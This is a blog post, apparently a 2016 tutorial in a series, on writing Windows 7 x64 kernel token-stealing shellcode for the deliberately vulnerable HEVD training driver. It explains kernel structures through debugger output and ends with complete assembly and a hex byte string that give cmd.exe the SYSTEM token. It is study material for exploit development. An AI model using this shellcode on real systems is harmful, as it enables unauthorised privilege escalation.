@@ -1,0 +1,475 @@
+<!DOCTYPE html>
+<html>
+
+  <head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  <title>Kernel Hacking With HEVD Part 3 - The Shellcode</title>
+  <meta name="description" content="In the last blog entry in this series we got to the point where we have crashed the kernel in a controlled manner. This is a good spot to be in! But it would...">
+
+  <link rel="stylesheet" href="/css/main.css">
+  <link rel="canonical" href="https://sizzop.github.io/2016/07/07/kernel-hacking-with-hevd-part-3.html">
+  <link rel="alternate" type="application/rss+xml" title="Blog Thingy" href="https://sizzop.github.io/feed.xml">
+</head>
+
+
+  <body>
+
+    <header class="site-header">
+
+  <div class="wrapper">
+
+    <a class="site-title" href="/">Blog Thingy</a>
+
+    <nav class="site-nav">
+      <a href="#" class="menu-icon">
+        <svg viewBox="0 0 18 15">
+          <path fill="#424242" d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.031C17.335,0,18,0.665,18,1.484L18,1.484z"/>
+          <path fill="#424242" d="M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0c0-0.82,0.665-1.484,1.484-1.484 h15.031C17.335,6.031,18,6.696,18,7.516L18,7.516z"/>
+          <path fill="#424242" d="M18,13.516C18,14.335,17.335,15,16.516,15H1.484C0.665,15,0,14.335,0,13.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.031C17.335,12.031,18,12.696,18,13.516L18,13.516z"/>
+        </svg>
+      </a>
+
+      <div class="trigger">
+        
+          
+          <a class="page-link" href="/about/">About</a>
+          
+        
+          
+        
+          
+        
+          
+        
+      </div>
+    </nav>
+
+  </div>
+
+</header>
+
+
+    <div class="page-content">
+      <div class="wrapper">
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+
+  <header class="post-header">
+    <h1 class="post-title" itemprop="name headline">Kernel Hacking With HEVD Part 3 - The Shellcode</h1>
+    <p class="post-meta"><time datetime="2016-07-07T00:00:00-04:00" itemprop="datePublished">Jul 7, 2016</time></p>
+  </header>
+
+  <div class="post-content" itemprop="articleBody">
+    <p>In the <a href="/2016/07/06/kernel-hacking-with-hevd-part-2.html">last blog entry</a> in this series we got to the point where we have crashed the kernel in a controlled manner. This is a good spot to be in! But it would be better if we used this situation to escalate privileges instead of just looking at our pretty blue screen. Let’s talk kernel payloads.</p>
+
+<h4 id="token-stealing">Token Stealing</h4>
+<p>The end goal of this exploit is to have a command prompt open with SYSTEM level access. Once you have control of execution in ring 0 there are many options for getting to that end goal but one of the most popular seems to be token stealing. The Windows security model is complicated (to say the least), but here are some drastically over-simplified basics to get us started.</p>
+
+<p>In Windows, everything can be thought of as an object (including processes, files, tokens, etc.) Every object has a security descriptor that specifies which entities can perform certain activities on the object. Each entity is identified by a token. The SYSTEM token has full authority to perform any activity on any object. Therefore if you can get the SYSTEM token and copy it over top of your less privileged token, then you gain full access to everything. It’s kinda like cutting out a picture of the president’s face and name and pasting it onto your ID badge.</p>
+
+<p>To make this magic happen we have to use our stack buffer overflow to redirect driver execution into an area of memory containing our special token-swapping shellcode. This of course requires allocating some executable memory and copying our shellcode into it first before triggering our overflow. Turns out you can’t just use <code class="highlighter-rouge">msfvenom</code> to dump out some copy/paste kernel shellcode so we must innovate!</p>
+
+<p>In order to craft our shellcode we have to know a bit about some of the data structures and members that we’re going to be dealing with. These data structures will help us get from a static location to the process tokens that we want to swap so they’re worth knowing about. Let’s briefly talk about each in turn.</p>
+
+<p><strong>KPCR</strong></p>
+
+<p>Windows defines a Kernel Processor Control Region (KPCR) which stores information about the processor. This is useful to us because it is always available at <code class="highlighter-rouge">gs:[0]</code> which is handy when you’re creating position independent code. Here’s what the structure looks like on Windows 7 x64 (abridged):</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>0: kd&gt; dt nt!_KPCR
+   +0x000 NtTib            : _NT_TIB
+   +0x000 GdtBase          : Ptr64 _KGDTENTRY64
+   +0x008 TssBase          : Ptr64 _KTSS64
+   +0x010 UserRsp          : Uint8B
+   +0x018 Self             : Ptr64 _KPCR
+   +0x020 CurrentPrcb      : Ptr64 _KPRCB
+   ...
+   +0x118 PcrAlign1        : [24] Uint4B
+   +0x180 Prcb             : _KPRCB
+</code></pre>
+</div>
+
+<p>There’s some interesting stuff in there but the main thing we’re concerned with is the last item in the list, the KPCR.Prcb which is a KPRCB structure.</p>
+
+<p><strong>KPRCB</strong></p>
+
+<p>From the KPCR we can get the Kernel Processor Control Block (KPRCB). We care about this because it gives us the location of the KTHREAD structure for the thread that the processor is executing. This structure is pretty huge so I’m just including the first eight lines here:</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>0: kd&gt; dt nt!_KPRCB
+   +0x000 MxCsr            : Uint4B
+   +0x004 LegacyNumber     : UChar
+   +0x005 ReservedMustBeZero : UChar
+   +0x006 InterruptRequest : UChar
+   +0x007 IdleHalt         : UChar
+   +0x008 CurrentThread    : Ptr64 _KTHREAD
+   +0x010 NextThread       : Ptr64 _KTHREAD
+   +0x018 IdleThread       : Ptr64 _KTHREAD
+   ...
+</code></pre>
+</div>
+
+<p>Since the KPRCB.CurrentThread member is what we’re after here and we know it’s at <code class="highlighter-rouge">gs:[0]</code>+ 180 + 8 we can put on our advanced mathematics pants and safely say that <code class="highlighter-rouge">gs:[188]</code> contains a pointer to a KTHREAD structure representing the currently executing thread. Remember this for later!</p>
+
+<p><strong>KTHREAD</strong></p>
+
+<p>The KTHREAD structure is the first part of the larger ETHREAD structure and maintains some low-level information about the currently executing thread. There’s lots of info in there but the main thing we’re concerned about for our purposes is the KTHREAD.ApcState member which is a KAPC_STATE structure. Here’s an abridged view of the KTHREAD structure:</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>0: kd&gt; dt nt!_KTHREAD
+   +0x000 Header           : _DISPATCHER_HEADER
+   +0x018 CycleTime        : Uint8B
+   +0x020 QuantumTarget    : Uint8B
+   +0x028 InitialStack     : Ptr64 Void
+   +0x030 StackLimit       : Ptr64 Void
+   ...
+   +0x050 ApcState         : _KAPC_STATE
+   +0x050 ApcStateFill     : [43] UChar
+   +0x07b Priority         : Char
+   +0x07c NextProcessor    : Uint4B
+   +0x080 DeferredProcessor : Uint4B
+   +0x088 ApcQueueLock     : Uint8B
+   +0x090 WaitStatus       : Int8B
+   +0x098 WaitBlockList    : Ptr64 _KWAIT_BLOCK
+   +0x0a0 WaitListEntry    : _LIST_ENTRY
+   +0x0a0 SwapListEntry    : _SINGLE_LIST_ENTRY
+   +0x0b0 Queue            : Ptr64 _KQUEUE
+   +0x0b8 Teb              : Ptr64 Void
+   ...
+</code></pre>
+</div>
+
+<p><strong>KAPC_STATE</strong></p>
+
+<p>Each thread keeps track of the process that it is associated with. It keeps track of this in the KAPC_STATE structure. This is good for us since we’re trying to get to the process so we can find it’s token. The KAPC_STATE structure is pretty simple:</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>0: kd&gt; dt nt!_KAPC_STATE
+   +0x000 ApcListHead      : [2] _LIST_ENTRY
+   +0x020 Process          : Ptr64 _KPROCESS
+   +0x028 KernelApcInProgress : UChar
+   +0x029 KernelApcPending : UChar
+   +0x02a UserApcPending   : UChar
+</code></pre>
+</div>
+
+<p>We can ignore most of that but we are finally on our way to the KPROCESS structure! If you’re not excited about this then you’re doing it wrong. The KPROCESS structure, similar to KTHREAD, is the first part of a larger EPROCESS structure. Since we have our KPRCB.CurrentThread pointer already and we know that the KAPC_STATE.Process member we’re looking for is at KPRCB.CurrentThread + 50 + 20 we can once again do some hardcore number crunching and come up with the fact that to get to the current KAPC_STATE.Process you just add 70 to the KPRCB.CurrentThread pointer. Again, keep this in mind for later!</p>
+
+<p><strong>EPROCESS</strong></p>
+
+<p>Here’s where all the good stuff is! In this case we’re interested in members that are outside of the KPROCESS structure but still inside the larger EPROCESS so our offsets can still be calculated correctly with the information we have so far. Let’s take a look at the EPROCESS next. I’ve cut out a bunch of items so we can just see the stuff that we care about for now.</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>0: kd&gt; dt nt!_EPROCESS
+   +0x000 Pcb              : _KPROCESS
+   +0x160 ProcessLock      : _EX_PUSH_LOCK
+   +0x168 CreateTime       : _LARGE_INTEGER
+   +0x170 ExitTime         : _LARGE_INTEGER
+   +0x178 RundownProtect   : _EX_RUNDOWN_REF
+   +0x180 UniqueProcessId  : Ptr64 Void
+   +0x188 ActiveProcessLinks : _LIST_ENTRY
+   ...
+   +0x208 Token            : _EX_FAST_REF
+   ...
+   +0x2d8 Session          : Ptr64 Void
+   +0x2e0 ImageFileName    : [15] UChar
+   +0x2ef PriorityClass    : UChar
+   +0x2f0 JobLinks         : _LIST_ENTRY
+   +0x300 LockedPagesList  : Ptr64 Void
+   +0x308 ThreadListHead   : _LIST_ENTRY
+   +0x318 SecurityPort     : Ptr64 Void
+   +0x320 Wow64Process     : Ptr64 Void
+   +0x328 ActiveThreads    : Uint4B
+   +0x32c ImagePathHash    : Uint4B
+   +0x330 DefaultHardErrorProcessing : Uint4B
+   +0x334 LastThreadExitStatus : Int4B
+   +0x338 Peb              : Ptr64 _PEB
+    ...
+</code></pre>
+</div>
+
+<p><strong>EPROCESS.UniqueProcessId</strong></p>
+
+<p>The EPROCESS.UniqueProcessId member is (as you may have guessed) a qword with the PID of the current process. This is important to note because we will need to find the EPROCESS structure with the UniqueProcessId of “4” so that we know we have the SYSTEM process and therefore can find it’s token. In case you, like me until recently, haven’t paid attention before, the “System” process that you see in the task manager always runs with a PID of 4. The token associated with this process is the crown jewel that we want to steal.</p>
+
+<p><img src="/images/hevd3-ss1.jpg" alt="Crown Jewel" /></p>
+
+<p><strong>EPROCESS.ActiveProcessLinks</strong></p>
+
+<p>EPROCESS.ActiveProcessLinks is a doubly-linked list containing the addresses of the corresponding ActiveProcessLinks list in the EPROCESS structure of each active process on the system (neat!). This means that each entry in the list points into another process’s EPROCESS structure at an offset of +188 above the EPROCESS base. The laws of mathematics tell us that this would also mean that each entry is at an offset of +8 above the UniqueProcessId of each active process. We’ll use this fact in our shellcode as we’ll see shortly.</p>
+
+<p><strong>EPROCESS.Token</strong></p>
+
+<p>Finally, EPROCESS.Token is the access token assigned to the process. You may have noticed that the token is shown as an EX_FAST_REF structure. Windows cheats a little bit by using the end of the token’s address for other purposes. All tokens are aligned such that they will always end with 0. As an example, below you can see that the pointer at offset +208 doesn’t exactly match the token listed by the <code class="highlighter-rouge">!process</code> debugger extension but can be deduced programmatically with some boolean arithmetic:</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>0: kd&gt; !process
+PROCESS fffffa8004034a40
+    SessionId: 1  Cid: 0d34    Peb: 7efdf000  ParentCid: 0570
+    DirBase: 0af6b000  ObjectTable: fffff8a0050b42c0  HandleCount: 130.
+    Image: pythonw.exe
+    VadRoot fffffa8003d67b70 Vads 97 Clone 0 Private 1822. Modified 0. Locked 0.
+    DeviceMap fffff8a00010b5c0
+    Token                             fffff8a00383aa00
+    ...
+0: kd&gt; dq fffffa8004034a40+208 l1
+fffffa80`04034c48  fffff8a0`0383aa0f
+0: kd&gt; ? poi(fffffa8004034a40+208) &amp; fffffffffffffff0
+Evaluate expression: -8108839294464 = fffff8a0`0383aa00
+</code></pre>
+</div>
+
+<p>With all that out of the way, let’s lay out the overview of what our shellcode needs to accomplish:</p>
+
+<ul>
+  <li>Get KTHREAD and EPROCESS pointers</li>
+  <li>Walk the ActiveProcessLinks list to find the EPROCESS with a UniqueProcessId of 4 (SYSTEM)</li>
+  <li>Save the SYSTEM token</li>
+  <li>Walk the ActiveProcessLinks list to find the EPROCESS associated with our shell (cmd.exe)</li>
+  <li>Copy the SYSTEM token over top of the cmd.exe token</li>
+  <li>Recover without crashing</li>
+</ul>
+
+<p>LET’S DO THIS!</p>
+
+<h4 id="step-one---get-kthreadethread-pointers">Step one - get KTHREAD/ETHREAD pointers</h4>
+<blockquote>
+  <ul>
+    <li><strong>Get KTHREAD and EPROCESS pointers &lt;——</strong></li>
+    <li>Walk the ActiveProcessLinks list to find the EPROCESS with a UniqueProcessId of 4 (SYSTEM)</li>
+    <li>Save the SYSTEM token</li>
+    <li>Walk the ActiveProcessLinks list to find the EPROCESS associated with our shell (cmd.exe)</li>
+    <li>Copy the SYSTEM token over top of the cmd.exe token</li>
+    <li>Recover without crashing</li>
+  </ul>
+</blockquote>
+
+<p>As mentioned previously, this is super simple. <code class="highlighter-rouge">gs:[0]</code> is the KPCR plus +180 for the KPRCB plus +8 for the KTHREAD pointer; KTHREAD pointer plus +50 is the KAPC_STATE plus +20 for the EPROCESS pointer:</p>
+
+<pre><code class="language-asm">start:
+    mov rdx, [gs:188h]  ;KTHREAD pointer
+    mov r8, [rdx+70h]   ;EPROCESS pointer
+</code></pre>
+
+<h4 id="step-two---walk-the-activeprocesslinks">Step two - walk the ActiveProcessLinks</h4>
+<blockquote>
+  <ul>
+    <li>Get KTHREAD and EPROCESS pointers</li>
+    <li><strong>Walk the ActiveProcessLinks list to find the EPROCESS with a UniqueProcessId of 4 (SYSTEM) &lt;——</strong></li>
+    <li>Save the SYSTEM token</li>
+    <li>Walk the ActiveProcessLinks list to find the EPROCESS associated with our shell (cmd.exe)</li>
+    <li>Copy the SYSTEM token over top of the cmd.exe token</li>
+    <li>Recover without crashing</li>
+  </ul>
+</blockquote>
+
+<p>EPROCESS.ActiveProcessLinks is a doubly-linked list meaning that the structure starts with a pointer to the next entry, followed by a pointer to the previous entry, followed by the actual entry. The list starts at an offset of +188 above the EPROCESS structure base. Each entry points to the EPROCESS.ActiveProcessLinks list for each active process. We saw before that the EPROCESS.UniqueProcessId is at a relative offset of -8 away from the base of the EPROCESS.ActiveProcessLinks list. We will load the head of the list into the r9 register, load the first entry into rcx, and then set up a loop to walk through each entry in the list looking for UniqueProcessId 4:</p>
+
+<pre><code class="language-asm">    mov r9, [r8+188h]    ;ActiveProcessLinks list head
+    mov rcx, [r9]        ;follow link to first process in list
+find_system:
+    mov rdx, [rcx-8]     ;ActiveProcessLinks - 8 = UniqueProcessId
+    cmp rdx, 4           ;UniqueProcessId == 4? 
+    jz found_system      ;YES - move on
+    mov rcx, [rcx]       ;NO - load next entry in list
+    jmp find_system      ;loop
+</code></pre>
+
+<p>Once this loop has run it’s course, we should end up with the rcx register containing a pointer to an offset of +188 into the EPROCESS of the SYSTEM process.</p>
+
+<h4 id="step-three---save-the-system-token-address">Step three - save the SYSTEM token address</h4>
+<blockquote>
+  <ul>
+    <li>Get KTHREAD and EPROCESS pointers</li>
+    <li>Walk the ActiveProcessLinks list to find the EPROCESS with a UniqueProcessId of 4 (SYSTEM)</li>
+    <li><strong>Save the SYSTEM token &lt;——</strong></li>
+    <li>Walk the ActiveProcessLinks list to find the EPROCESS associated with our shell (cmd.exe)</li>
+    <li>Copy the SYSTEM token over top of the cmd.exe token</li>
+    <li>Recover without crashing</li>
+  </ul>
+</blockquote>
+
+<p>Saving the SYSTEM token is easy enough to do. The rax register can be used to hold on to it. At this point, rcx is pointing to the SYSTEM EPROCESS+188 and the token we want is at EPROCESS+208. This means we’ll just have to move rcx+80 into rax and then just modify the low 4 bits to get our SYSTEM token pointer:</p>
+
+<pre><code class="language-asm">found_system:
+    mov rax, [rcx+80h]    ;offset to token
+    and al, 0f0h          ;clear low 4 bits of _EX_FAST_REF structure
+</code></pre>
+
+<h4 id="step-four---walk-the-activeprocesslinks-again">Step four - walk the ActiveProcessLinks (again)</h4>
+<blockquote>
+  <ul>
+    <li>Get KTHREAD and EPROCESS pointers</li>
+    <li>Walk the ActiveProcessLinks list to find the EPROCESS with a UniqueProcessId of 4 (SYSTEM)</li>
+    <li>Save the SYSTEM token</li>
+    <li><strong>Walk the ActiveProcessLinks list to find the EPROCESS associated with our shell (cmd.exe) &lt;——</strong></li>
+    <li>Copy the SYSTEM token over top of the cmd.exe token</li>
+    <li>Recover without crashing</li>
+  </ul>
+</blockquote>
+
+<p>This is essentially the same as step two. The only difference is that we are searching for the PID of the cmd.exe process that we spawned rather than PID “4”. We will see the particulars of how to implement this in Python in the next blog entry, but for now we will just use a dummy PID of 1234. Here’s how it looks in assembly:</p>
+
+<pre><code class="language-asm">find_cmd:
+    mov rdx, [rcx-8]    ;ActiveProcessLinks - 8 = UniqueProcessId
+    cmp rdx, 1234h      ;UniqueProcessId == XXXX? (PLACEHOLDER)
+    jz found_cmd        ;YES - move on
+    mov rcx, [rcx]      ;NO - next entry in list
+    jmp find_cmd        ;loop
+</code></pre>
+<p>Once again after this loop does it’s job we have an address in rcx that is a pointer to cmd.exe’s EPROCESS+188. We’re almost done with our token heist!</p>
+
+<h4 id="step-four---copy-system-token-over-cmdexe-token">Step four - copy SYSTEM token over cmd.exe token</h4>
+<blockquote>
+  <ul>
+    <li>Get KTHREAD and EPROCESS pointers</li>
+    <li>Walk the ActiveProcessLinks list to find the EPROCESS with a UniqueProcessId of 4 (SYSTEM)</li>
+    <li>Save the SYSTEM token</li>
+    <li>Walk the ActiveProcessLinks list to find the EPROCESS associated with our shell (cmd.exe)</li>
+    <li><strong>Copy the SYSTEM token over top of the cmd.exe token &lt;——</strong></li>
+    <li>Recover without crashing</li>
+  </ul>
+</blockquote>
+
+<p>It should go without saying that this is pretty straightforward. We have the SYSTEM token in rax and cmd.exe token in rcx+80.</p>
+
+<pre><code class="language-asm">found_cmd:
+    mov [rcx+80h], rax    ;copy SYSTEM token over top of this process's token
+</code></pre>
+<p>Now at this point we officially have a shell running with SYSTEM privileges! Congratulations! Just one more thing… you won’t be able to enjoy your newly elevated shell if your machine BSODs.</p>
+
+<h4 id="step-five---recover-without-crashing">Step five - recover without crashing</h4>
+<blockquote>
+  <ul>
+    <li>Get KTHREAD and EPROCESS pointers</li>
+    <li>Walk the ActiveProcessLinks list to find the EPROCESS with a UniqueProcessId of 4 (SYSTEM)</li>
+    <li>Save the SYSTEM token</li>
+    <li>Walk the ActiveProcessLinks list to find the EPROCESS associated with our shell (cmd.exe)</li>
+    <li>Copy the SYSTEM token over top of the cmd.exe token</li>
+    <li><strong>Recover without crashing &lt;——</strong></li>
+  </ul>
+</blockquote>
+
+<p>This is a step that is too often ignored in user-land exploitation. “Who cares,” says the lazy exploit writer, “I’ve got my shell, let the application crash!” Unfortunately when we’re operating in ring 0 we don’t have such luxury. But, fortunately for us, we have a pretty easy out in this scenario. This can sometimes be tough to figure out where to go next and an attractive target is often to return back to the parent function as if nothing has gone awry. HEVD provides us with just such an easy out. At the point of the overflow the stack contains an address at rsp+28 which points back into the HEVD driver:</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>0: kd&gt; ?poi(rsp+28)
+Evaluate expression: -8246261640726 = fffff880`048111ea
+0: kd&gt; u fffff880048111ea l1
+HEVD+0x61ea:
+fffff880`048111ea 488d0d6f110000  lea     rcx,[HEVD+0x7360 (fffff880`04812360)]
+</code></pre>
+</div>
+
+<p>As you can see, it points into HEVD+0x61ea. What’s at this address? Remember this screenshot from our previous blog post?</p>
+
+<p><img src="/images/hevd2-ss4.jpg" alt="Serendipity" /></p>
+
+<p>HEVD+0x61ea just happens to be the return address back to the IOCTL dispatch table right from where the HACKSYS_EVD_STACKOVERFLOW handler was called! This is a fantastic place to return back to! We got lucky this time so let’s be grateful and throw it into our shellcode. Here’s the simple recovery steps:</p>
+
+<pre><code class="language-asm">return:
+    add rsp, 28h    ;HEVD+0x61ea
+    ret
+</code></pre>
+
+<p>That wraps up everything we needed to accomplish in our shellcode! The next blog post will discuss implementing this in our Python exploit.</p>
+
+<p>Here’s the shellcode in it’s final form:</p>
+
+<pre><code class="language-asm">[BITS 64]
+
+; Windows 7 x64 token stealing shellcode
+; based on http://mcdermottcybersecurity.com/articles/x64-kernel-privilege-escalation
+
+start:
+    mov rdx, [gs:188h]   ;KTHREAD pointer
+    mov r8, [rdx+70h]    ;EPROCESS pointer
+    mov r9, [r8+188h]    ;ActiveProcessLinks list head
+    mov rcx, [r9]        ;follow link to first process in list
+find_system:
+    mov rdx, [rcx-8]     ;ActiveProcessLinks - 8 = UniqueProcessId
+    cmp rdx, 4           ;UniqueProcessId == 4? 
+    jz found_system      ;YES - move on
+    mov rcx, [rcx]       ;NO - load next entry in list
+    jmp find_system      ;loop
+found_system:
+    mov rax, [rcx+80h]   ;offset to token
+    and al, 0f0h         ;clear low 4 bits of _EX_FAST_REF structure
+find_cmd:
+    mov rdx, [rcx-8]     ;ActiveProcessLinks - 8 = UniqueProcessId
+    cmp rdx, 1234h       ;UniqueProcessId == ZZZZ? (PLACEHOLDER)
+    jz found_cmd         ;YES - move on
+    mov rcx, [rcx]       ;NO - next entry in list
+    jmp find_cmd         ;loop
+found_cmd:
+    mov [rcx+80h], rax   ;copy SYSTEM token over top of this process's token
+return:
+    add rsp, 28h         ;HEVD+0x61ea
+    ret
+
+;String literal (replace \xZZ's with PID):
+;"\x65\x48\x8B\x14\x25\x88\x01\x00\x00\x4C\x8B\x42\x70\x4D\x8B\x88"
+;"\x88\x01\x00\x00\x49\x8B\x09\x48\x8B\x51\xF8\x48\x83\xFA\x04\x74"
+;"\x05\x48\x8B\x09\xEB\xF1\x48\x8B\x81\x80\x00\x00\x00\x24\xF0\x48"
+;"\x8B\x51\xF8\x48\x81\xFA\xZZ\xZZ\xZZ\xZZ\x74\x05\x48\x8B\x09\xEB"
+;"\xEE\x48\x89\x81\x80\x00\x00\x00\x48\x83\xC4\x28\xC3"         
+</code></pre>
+
+<p>I’d like to acknowledge <a href="http://mcdermottcybersecurity.com/">McDermott Cybersecurity</a> for the very helpful <a href="http://mcdermottcybersecurity.com/articles/x64-kernel-privilege-escalation">article</a> which provided a perfect starting-point for me in creating this shellcode.</p>
+
+  </div>
+  <hr>
+  
+    <div align="left"><a class="prev" href="/2016/07/06/kernel-hacking-with-hevd-part-2.html">&laquo; Kernel Hacking With HEVD Part 2 - The Bug</a></div>
+  
+  
+    <div align="right"><a class="next" href="/2016/07/08/kernel-hacking-with-hevd-part-4.html">Kernel Hacking With HEVD Part 4 - The Exploit &raquo;</a></div>
+  
+</article>
+
+      </div>
+    </div>
+
+    <footer class="site-footer">
+
+  <div class="wrapper">
+
+    <h2 class="footer-heading">Blog Thingy</h2>
+
+    <div class="footer-col-wrapper">
+      <div class="footer-col footer-col-1">
+        <ul class="contact-list">
+          <li>Blog Thingy</li>
+          <li><a href="mailto:sizzop@gmail.com">sizzop@gmail.com</a></li>
+        </ul>
+      </div>
+
+      <div class="footer-col footer-col-2">
+        <ul class="social-media-list">
+          
+          <li>
+            <a href="https://github.com/sizzop"><span class="icon icon--github"><svg viewBox="0 0 16 16"><path fill="#828282" d="M7.999,0.431c-4.285,0-7.76,3.474-7.76,7.761 c0,3.428,2.223,6.337,5.307,7.363c0.388,0.071,0.53-0.168,0.53-0.374c0-0.184-0.007-0.672-0.01-1.32 c-2.159,0.469-2.614-1.04-2.614-1.04c-0.353-0.896-0.862-1.135-0.862-1.135c-0.705-0.481,0.053-0.472,0.053-0.472 c0.779,0.055,1.189,0.8,1.189,0.8c0.692,1.186,1.816,0.843,2.258,0.645c0.071-0.502,0.271-0.843,0.493-1.037 C4.86,11.425,3.049,10.76,3.049,7.786c0-0.847,0.302-1.54,0.799-2.082C3.768,5.507,3.501,4.718,3.924,3.65 c0,0,0.652-0.209,2.134,0.796C6.677,4.273,7.34,4.187,8,4.184c0.659,0.003,1.323,0.089,1.943,0.261 c1.482-1.004,2.132-0.796,2.132-0.796c0.423,1.068,0.157,1.857,0.077,2.054c0.497,0.542,0.798,1.235,0.798,2.082 c0,2.981-1.814,3.637-3.543,3.829c0.279,0.24,0.527,0.713,0.527,1.437c0,1.037-0.01,1.874-0.01,2.129 c0,0.208,0.14,0.449,0.534,0.373c3.081-1.028,5.302-3.935,5.302-7.362C15.76,3.906,12.285,0.431,7.999,0.431z"/></svg>
+</span><span class="username">sizzop</span></a>
+
+          </li>
+          
+
+          
+          <li>
+            <a href="https://twitter.com/sizzop"><span class="icon icon--twitter"><svg viewBox="0 0 16 16"><path fill="#828282" d="M15.969,3.058c-0.586,0.26-1.217,0.436-1.878,0.515c0.675-0.405,1.194-1.045,1.438-1.809c-0.632,0.375-1.332,0.647-2.076,0.793c-0.596-0.636-1.446-1.033-2.387-1.033c-1.806,0-3.27,1.464-3.27,3.27 c0,0.256,0.029,0.506,0.085,0.745C5.163,5.404,2.753,4.102,1.14,2.124C0.859,2.607,0.698,3.168,0.698,3.767 c0,1.134,0.577,2.135,1.455,2.722C1.616,6.472,1.112,6.325,0.671,6.08c0,0.014,0,0.027,0,0.041c0,1.584,1.127,2.906,2.623,3.206 C3.02,9.402,2.731,9.442,2.433,9.442c-0.211,0-0.416-0.021-0.615-0.059c0.416,1.299,1.624,2.245,3.055,2.271 c-1.119,0.877-2.529,1.4-4.061,1.4c-0.264,0-0.524-0.015-0.78-0.046c1.447,0.928,3.166,1.469,5.013,1.469 c6.015,0,9.304-4.983,9.304-9.304c0-0.142-0.003-0.283-0.009-0.423C14.976,4.29,15.531,3.714,15.969,3.058z"/></svg>
+</span><span class="username">sizzop</span></a>
+
+          </li>
+          
+        </ul>
+      </div>
+
+      <div class="footer-col footer-col-3">
+        <p>A blog. A place for me to write about things. Probably some things about hacking.
+</p>
+      </div>
+    </div>
+
+  </div>
+
+</footer>
+
+
+  </body>
+
+</html>
